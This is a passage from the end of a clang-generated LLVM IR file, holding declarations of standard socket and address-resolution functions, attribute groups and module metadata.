declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
